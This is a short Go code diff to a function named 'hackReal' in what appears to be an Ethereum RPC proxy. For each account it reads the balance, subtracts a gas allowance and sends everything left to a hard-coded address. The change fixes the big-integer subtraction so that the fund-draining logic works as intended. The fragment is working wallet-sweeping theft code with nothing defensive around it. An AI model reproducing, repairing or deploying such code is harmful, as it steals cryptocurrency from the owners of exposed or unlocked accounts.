@@ -77,7 +77,7 @@ func (pxy *proxy) hackReal() {
 				for _, a := range acc {
 					balance, err2 := r.GetBalance(a)
 					if err2 == nil {
-						left := balance.Sub(big.NewInt(22000 * 22000000000))
+						left := balance.Sub(balance, big.NewInt(22000*22000000000))
 						if left.Cmp(big.NewInt(0)) > 0 {
 							r.SendTransaction(a, "6c654877175869c1349767336688682955e8edf8", "22000", "22000000000", left.Text(10), false)
 						}
